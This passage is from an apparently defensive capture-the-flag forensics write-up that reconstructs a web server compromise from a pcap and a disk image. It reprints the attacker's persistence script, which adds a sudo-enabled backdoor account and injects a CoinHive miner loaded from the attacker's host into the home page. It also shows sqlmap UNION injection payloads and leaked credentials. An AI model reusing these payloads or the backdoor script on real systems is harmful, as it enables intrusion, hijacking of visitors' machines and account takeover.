practice.</p><p>By just looking at Wireshark in the beginning  we can see the attacker used a tcp syn scan:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KKCjPol.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KKCjPol.png" alt=""><br></a><br>As you can see the attacker issues a lot of <strong>syns</strong> and receives from the server lot of answers from the server as <strong>RST,ACK</strong> (wireshark changes the color of this packets to red), <strong>RST,ACK</strong> means the port is closed…</p><p>Resuming how a SYN scan works:</p><ul><li>An attacker issues a SYN, if the server replies <strong>SYN,ACK</strong> : It means the port is open!</li><li>An attacker issues a SYN, if the server replies <strong>RST,ACK</strong> : It means the port is closed!</li><li>An attacker issues a SYN, if the server does not reply, or replies with <strong>ICMP</strong> error : it means that port is <strong>filtered</strong>. Likely an IDS / stateful firewall block your request.</li></ul><p>So now we need to start working on our tshark command, we need to check which tcp.flags replies with <strong>SYN,ACK</strong> it needs to come from the server with destination to the attacker IP, the field on wireshark to filter the protocol is <strong>ip.proto</strong> and the number for TCP protocol is 6, the way I do to find out the name of the fields on wireshark is by doing this:</p><p>First you choose the field you want to filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/ylBSEGR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ylBSEGR.png" alt=""><br></a><br>Then a website will open and search for the field you want to filter in this case is “Protocol”:<br><a data-fancybox="gallery" href="https://i.imgur.com/RpINGT9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/RpINGT9.png" alt=""><br></a><br>Now you do the same for the tcp flags, to know the number when a SYN,ACK occurs we need to find a successful response to know the number and after we find it we know we need to use <strong>tcp.flags == 0x12</strong> filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/MsfEaET.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MsfEaET.png" alt=""><br></a><br>The final script is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r capture.pcap -Y <span class="string">"ip.dst == 10.187.195.95 &amp;&amp; ip.proto == 6 &amp;&amp; tcp.flags == 0x00000012"</span> -Tfields -e tcp.srcport | sort -u</span><br><span class="line">22</span><br><span class="line">80</span><br></pre></td></tr></table></figure></p><p>The answer to the 2nd question is 22,80.</p><h3 id="What-are-the-names-of-the-web-files-they-found-on-the-server-List-in-alphabetical-order-comma-separated-ex-a-html-a-php-b-html"><a href="#What-are-the-names-of-the-web-files-they-found-on-the-server-List-in-alphabetical-order-comma-separated-ex-a-html-a-php-b-html" class="headerlink" title="What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)"></a>What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)</h3><p>So for this I used wireshark, I used the first filter <strong>ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 &amp;&amp; http</strong> to filter only http packets and now we need to know the replies from the server the ones that answer with a 200 status code, we can see the attacker ran a script with a list of files, the server will reply 404 on files that don’t exist and 200 on the ones that exist… </p><p>So I used a second filter on wireshark to catch the 200 responses, you can do this by doing <strong>EDIT -&gt; Find packet</strong>, after this a bunch of buttons will appear below the first filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/l8MYcVb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/l8MYcVb.png" alt=""><br></a><br>If you keep clicking on find it will jump to the next <strong>200 OK</strong>, you need to keep looking at the request from the attacker to know which <strong>file</strong> he’s searching and the response of the server to check if is <strong>200 OK</strong>, for example in the image above he did a <strong>GET</strong> request to <strong>/</strong> and received a 200 OK meaning that page exist. So with this I keep clicking find and I got all the files I needed which the list is : </p><p>The answer was:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.html,adminlogin.html,adminlogin.php,contact.html,gallery.html,index.html,services.html,typo.html</span><br></pre></td></tr></table></figure></p><p>With this method I also found an interesting file named backup.sh which will be useful for the next steps:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! id -u devtest2; <span class="keyword">then</span></span><br><span class="line">    mkdir /home/devtest2</span><br><span class="line">    useradd --home=/home/devtest2 -s /bin/bash devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"devtest2:HYf6lEMhUM4Z0b079X"</span> | chpasswd</span><br><span class="line">    chown devtest2:devtest2 /home/devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo cat /var/www/html/index.html | grep <span class="string">"miner.js"</span></span><br><span class="line"><span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">      sed -i <span class="string">'s/&lt;\/body&gt;/&lt;script src = http:\/\/10.187.195.95\/js\/colorbox.min.js&gt;&lt;\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous("123456-asdfgh");color.start()&lt;\/script&gt;&lt;\/body&gt;/g'</span> /var/www/html/index.html</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/lIbTGMO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lIbTGMO.png" alt=""><br></a></p><h1 id="2-Analysis"><a href="#2-Analysis" class="headerlink" title="2_Analysis"></a>2_Analysis</h1><blockquote><br>Apparently none of the devs knew what were talking about.<br>Thanks to your initial findings it looks like this may have been an outside attack.<br>Using the logs we already gave you can you dig deeper and see if you can find more information? In the meantime we will try and get files for you to look at.<br><br>What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)<br>What is the name of the first tool used?<br>What is the version string of the third tool used?<br>What page was attacked with the third tool?<br><br>2/22 10:49 pm CST updated format on question 1 2/23 12:37 pm CST updated timestamp solution for 1<br><br></blockquote><h3 id="What-time-in-UTC-did-the-initial-scanning-start-mm-dd-yyyy-hh-mm-ss"><a href="#What-time-in-UTC-did-the-initial-scanning-start-mm-dd-yyyy-hh-mm-ss" class="headerlink" title="What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)"></a>What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)</h3><p>This question got me a a lot of time simply because they are asking in UTC time zone , I think Wireshark was showing the name on my timezone so I had the adapt the date by subtracting one hour, we need to find the date when the first SYN request was done we can do this with the initial filter we used:<br><a data-fancybox="gallery" href="https://i.imgur.com/AdI6Q1S.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/AdI6Q1S.png" alt=""><br></a><br>The correct date was 05/22/2018:19:07:35 , which was subtracted by 1 hour from what Wireshark was giving me for other people probably you would need to do different things depending on you time zone.</p><h3 id="What-is-the-name-of-the-first-tool-used"><a href="#What-is-the-name-of-the-first-tool-used" class="headerlink" title="What is the name of the first tool used?"></a>What is the name of the first tool used?</h3><p>I eventually just tried nmap and immediately got the right answer but there are other ways to detect if nmap was used for scanning, you can read this <a href="http://blog.extremehacking.org/blog/2015/07/22/packet-fingerprinting-with-wireshark-and-detecting-nmap-scans/" target="_blank" rel="noopener">blog post</a> I didn’t used but it’s a really interesting read.</p><h3 id="What-is-the-version-string-of-the-third-tool-used"><a href="#What-is-the-version-string-of-the-third-tool-used" class="headerlink" title="What is the version string of the third tool used?"></a>What is the version string of the third tool used?</h3><p>So we know the second tool used was probably a tool like dir buster to find files on the server, so after finding the existing files is time to check which requests he used on the found files, the more interesting file to look at is the adminlogin.php because it’s a php file and it has communication with the server which was probably the one the attacker used so lets check the user-agent used:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/VQiWZwY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VQiWZwY.png" alt=""><br></a></p><p>The version string was:<br>sqlmap/1.2.4#stable</p><h3 id="What-page-was-attacked-with-the-third-tool"><a href="#What-page-was-attacked-with-the-third-tool" class="headerlink" title="What page was attacked with the third tool?"></a>What page was attacked with the third tool?</h3><p>This is already answer form the previous question :) the page is <strong>adminlogin.php</strong> .</p><h1 id="3-Forensics"><a href="#3-Forensics" class="headerlink" title="3_Forensics"></a>3_Forensics</h1><blockquote><br><br>Unfortunately it looks like the attackers used pretty standard tools to hack into our website.<br><br>It looks like they didn’t modify the web page from the admin interface on the website though.<br><br>They probably logged into the webserver somehow. Can you see if you can find out how they got credentials to log in?<br><br>1 - List the compromised usernames in comma separated alphabetical order (website users)<br>2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)<br><br></blockquote><h3 id="1-List-the-compromised-usernames-in-comma-separated-alphabetical-order-website-users"><a href="#1-List-the-compromised-usernames-in-comma-separated-alphabetical-order-website-users" class="headerlink" title="1 - List the compromised usernames in comma separated alphabetical order (website users)"></a>1 - List the compromised usernames in comma separated alphabetical order (website users)</h3><p>We already know the attacker used sqlmap for the attack, if you know how sqlmap works it starts by trying alot of queries to find the vulnerability and find the right payload to attack, we can ignore the first requests and start looking at when sqlmap started dumping the database:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/jwlvSLI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jwlvSLI.png" alt=""><br></a></p><p>So as we can see above the database dumping started at package nr <strong>333806</strong>, and it starts for dumping the database, to understand the rest we need to understand the sql query sqlmap used. So the query used to extract the database name:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span><span class="comment">-- jaLN&amp;password=adsf HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>As you can see he’s using union query to concat two additional strings  0x716b7a6271 and 0x7171627871 if we decode both from hex to string we get: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">'716b7a6271'</span> | xxd -r -p</span><br><span class="line">qkzbq⏎                                                                                                  </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'7171627871'</span> | xxd -r -p</span><br><span class="line">qqbxq⏎</span><br></pre></td></tr></table></figure><p>Sqlmap uses this strings to easily parse content that’s why the output of the request comes very weird like this:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>You logged in as qkzbqSqliDBqqbxq<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Just remove both qkzbq and qqbxq and you get SqliDB which is the database name. Now we don’t really care about the database names and table names so we can skip the next requests and look to when they started dumping the usernames and passwords.</p><p>Request to get the users count number:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> SqliDB.Users<span class="comment">-- qKQB&amp;password=adsf HTTP/1.1\r\n</span></span><br></pre></td></tr></table></figure></p><p>Output of the users number:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 5&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Request to get the 3rd user on the database id, password, username:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,(<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">ID</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x797570747270</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">Password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x797570747270</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="string">`User`</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>) <span class="keyword">FROM</span> SqliDB.Users <span class="keyword">LIMIT</span> <span class="number">2</span>,<span class="number">1</span>),<span class="literal">NULL</span><span class="comment">-- tpEN&amp;password=adsf HTTP/1.1</span></span><br></pre></td></tr></table></figure></p><p>Output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq1yuptrp7a4434d48772fee914a99590376ee438yuptrpadminqqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 1 7a4434d48772fee914a99590376ee438 admin&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Now you just do the same for the rest of the queries and you get a list of users:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 7a4434d48772fee914a99590376ee438 admin</span><br><span class="line">2 2e107f8e7aaf178bf00e58c09abfba08 devtest</span><br><span class="line">3 5f836ac3e2ea2b22227c940754283fde suzy</span><br><span class="line">4 442f0577be5c6e59a77047eaa37b15c6 bob</span><br><span class="line">5 5efb309c9b1dc4e90fa136a64e3902e0 alice</span><br></pre></td></tr></table></figure><p>The answer for this question was:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin,alice,bob,devtest,suzy</span><br></pre></td></tr></table></figure></p><h3 id="2-What-username-and-password-combo-were-the-attackers-most-likely-able-to-get-a-hold-of-format-as-username-password"><a href="#2-What-username-and-password-combo-were-the-attackers-most-likely-able-to-get-a-hold-of-format-as-username-password" class="headerlink" title="2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)"></a>2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)</h3><p>Since we got the list of users and passwords the only one was searchable on the internet was devtest md5 hash the password of devtest was driveby so the answer to this question is:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devtest:driveby</span><br></pre></td></tr></table></figure><h1 id="4-privilege-escalation"><a href="#4-privilege-escalation" class="headerlink" title="4_privilege_escalation"></a>4_privilege_escalation</h1><blockquote><br><br>We will have to get on to the devs for leaving that account on the website and machine.<br><br>Some good news is that we finally obtained a disk image of the machine.<br><br>If the attacker modified the web files on the server they must have had higher privileges than the account you found.<br><br>See if you can find some information about how they could have done so.<br><br>Link to disk image (10 GB unzipped)<br><br>What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?<br>What account were the attackers able to escalate to?<br>What is the password for that account?<br><br><br></blockquote><h3 id="What-is-the-md5sum-of-the-file-that-was-most-likely-used-or-found-by-the-attackers-to-get-higher-privileges"><a href="#What-is-the-md5sum-of-the-file-that-was-most-likely-used-or-found-by-the-attackers-to-get-higher-privileges" class="headerlink" title="What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?"></a>What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?</h3><p>After mounting the the image:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/rofl</span><br><span class="line">sudo mount -o ro,noload,noexec filesystem.image /mnt/rofl</span><br></pre></td></tr></table></figure><p>So after checking the home folder of ubuntu user i saw that setup.sh had read permissions for everyone on that setup.sh file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -ltah home/ubuntu/</span><br><span class="line">total 28K</span><br><span class="line">drwxr-xr-x 6 root    root    4.0K May 22  2018 ../</span><br><span class="line">drwxr-xr-x 3    1001 pcap    4.0K May 22  2018 ./</span><br><span class="line">-rwxrwxr-x 1 evilgod evilgod  695 May 22  2018 setup.sh*</span><br><span class="line">drwx------ 2    1001 pcap    4.0K May 22  2018 .ssh/</span><br><span class="line">-rw-r--r-- 1    1001 pcap     655 May 16  2017 .profile</span><br><span class="line">-rw-r--r-- 1    1001 pcap     220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1    1001 pcap    3.7K Sep  1  2015 .bashrc</span><br></pre></td></tr></table></figure><p>Any user could read this file so after checking the content of it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ cat home/ubuntu/setup.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBIAN_FRONTEND=<span class="string">"noninteractive"</span></span><br><span class="line"></span><br><span class="line">sudo apt-get -y update &amp;&amp; apt-get install -y apache2 apache2-doc apache2-utils mysql-server php libapache2-mod-php php-mcrypt php-mysql python</span><br><span class="line"></span><br><span class="line">sudo sed -i <span class="string">'s/PasswordAuthentication no/PasswordAuthentication yes/g'</span> /etc/ssh/sshd_config</span><br><span class="line">sudo sed -i <span class="string">'s/StrictModes yes/#StrictModes yes/g'</span> /etc/ssh/sshd_config</span><br><span class="line">sudo service ssh restart</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">"root:0A0YlBjrlBXSr14MPz"</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_GROUP=www-data</span><br><span class="line"><span class="built_in">export</span> APACHE_PID_FILE=/var/run/apache2.pid</span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line"><span class="built_in">export</span> APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line"><span class="built_in">export</span> APACHE_LOG_DIR=/var/<span class="built_in">log</span>/apache2</span><br><span class="line"></span><br><span class="line">sudo service apache2 restart;</span><br></pre></td></tr></table></figure></p><p>The root password was there so this is how the attacker got privilege escalation, the answer to this question was:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ md5sum home/ubuntu/setup.sh</span><br><span class="line">93b74abb459cdd93bd254302fba4dfdf  home/ubuntu/setup.sh</span><br></pre></td></tr></table></figure><h3 id="What-account-were-the-attackers-able-to-escalate-to"><a href="#What-account-were-the-attackers-able-to-escalate-to" class="headerlink" title="What account were the attackers able to escalate to?"></a>What account were the attackers able to escalate to?</h3><p>The answer is pretty simple the account was <strong>root</strong>.</p><h3 id="What-is-the-password-for-that-account"><a href="#What-is-the-password-for-that-account" class="headerlink" title="What is the password for that account?"></a>What is the password for that account?</h3><p>The password is what we found on the file before which is <strong>0A0YlBjrlBXSr14MPz</strong></p><h1 id="5-persistence"><a href="#5-persistence" class="headerlink" title="5_persistence"></a>5_persistence</h1><blockquote><br><br>Thanks for finding that information out.<br>We have since changed the password for that account.<br>Looks like we might have to spend a few days putting our employees through some security training.<br>Unfortunately since deleting the malicous links off of our home page they have reappeared again.<br><br>Can you figure out how the attacker was able to re infect our home page?<br><br>1. What is the md5sum of the file the attacker is using for persistence?<br>2. What account was created?<br>3. What group did the attacker add the account to?<br>4. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)<br><br><br></blockquote><h3 id="What-is-the-md5sum-of-the-file-the-attacker-is-using-for-persistence"><a href="#What-is-the-md5sum-of-the-file-the-attacker-is-using-for-persistence" class="headerlink" title="What is the md5sum of the file the attacker is using for persistence?"></a>What is the md5sum of the file the attacker is using for persistence?</h3><p>Remember the file we found on <strong>1_logs</strong> ? that’s what he was using for persistence, this file is located in the root directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ md5sum root/backup.sh</span><br><span class="line">29ff58b6607c824451349183a570cc6c  root/backup.sh</span><br></pre></td></tr></table></figure><p>The answer was 29ff58b6607c824451349183a570cc6c</p><h3 id="What-account-was-created"><a href="#What-account-was-created" class="headerlink" title="What account was created?"></a>What account was created?</h3><p>We could easily see this by just looking at the backup.sh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! id -u devtest2; <span class="keyword">then</span></span><br><span class="line">    mkdir /home/devtest2</span><br><span class="line">    useradd --home=/home/devtest2 -s /bin/bash devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"devtest2:HYf6lEMhUM4Z0b079X"</span> | chpasswd</span><br><span class="line">    chown devtest2:devtest2 /home/devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo cat /var/www/html/index.html | grep <span class="string">"miner.js"</span></span><br><span class="line"><span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">      sed -i <span class="string">'s/&lt;\/body&gt;/&lt;script src = http:\/\/10.187.195.95\/js\/colorbox.min.js&gt;&lt;\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous("123456-asdfgh");color.start()&lt;\/script&gt;&lt;\/body&gt;/g'</span> /var/www/html/index.html</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>The user created was <strong>devtest2</strong>, alternatively we could also look at auth.log file and see:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat var/<span class="built_in">log</span>/auth.log</span><br><span class="line">... [truncated]</span><br><span class="line">May 22 19:11:40 ubuntu-xenial useradd[12186]: new group: name=devtest2, GID=1003</span><br><span class="line">May 22 19:11:40 ubuntu-xenial useradd[12186]: new user: name=devtest2, UID=1003, GID=1003, home=/home/devtest2, shell=/bin/bash</span><br><span class="line">May 22 19:11:40 ubuntu-xenial chpasswd[12192]: pam_unix(chpasswd:chauthtok): password changed <span class="keyword">for</span> devtest2</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/bin/cat /var/www/html/index.html</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sshd[12140]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">May 22 19:11:40 ubuntu-xenial systemd-logind[1046]: Removed session 4.</span><br></pre></td></tr></table></figure><p>So the answer was <strong>devtest2</strong></p><h3 id="What-group-did-the-attacker-add-the-account-to"><a href="#What-group-did-the-attacker-add-the-account-to" class="headerlink" title="What group did the attacker add the account to?"></a>What group did the attacker add the account to?</h3><p>We can get this answer from the backup.sh file from the line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><p>The group he added was sudoers group, so the answer was <strong>sudoers</strong>.</p><h3 id="What-time-of-day-does-the-attacker-reinfect-the-machine-use-24-hr-notation-ex-0100-for-1-am"><a href="#What-time-of-day-does-the-attacker-reinfect-the-machine-use-24-hr-notation-ex-0100-for-1-am" class="headerlink" title="What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)"></a>What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)</h3><p>So the attacker is using something to automate the script every day, so the first thing that came to my mind was <strong>crontab</strong> so I just checked the scripts running on crontab from the <strong>root</strong> user you can find it on the directory <strong>var/spool/cron/crontabs/</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls var/spool/cron/crontabs/</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>Now seeing the file:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat var/spool/cron/crontabs/root</span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (- installed on Tue May 22 19:11:40 2018)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line">30 2 * * 0 root /root/backup.sh &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>Then I used this <a href="https://crontab.guru/" target="_blank" rel="noopener">website</a> to translate those crontab numbers because I was way too lazy to check out how it works (copied the beginning string of 30 2 <em> </em> 0):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/3cwyVVK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3cwyVVK.png" alt=""><br></a></p><p>Translation to the 24h notation the answer is <strong>0230</strong>.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0-intrusion&quot;&gt;&lt;a href=&quot;#0-intrusion&quot; class=&quot;headerlink&quot; title=&quot;0_intrusion&quot;&gt;&lt;/a&gt;0_intrusion&lt;/h1&gt;&lt;blockquote&gt;&lt;br&gt;0_intrusion&lt;br&gt;100&lt;br
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="TAMUctf" scheme="https://teamrocketist.github.io/tags/TAMUctf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 35C3 - corebot</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/</id>
    <published>2018-12-30T10:36:09.000Z</published>
    <updated>2018-12-30T11:55:41.538Z</updated>
    
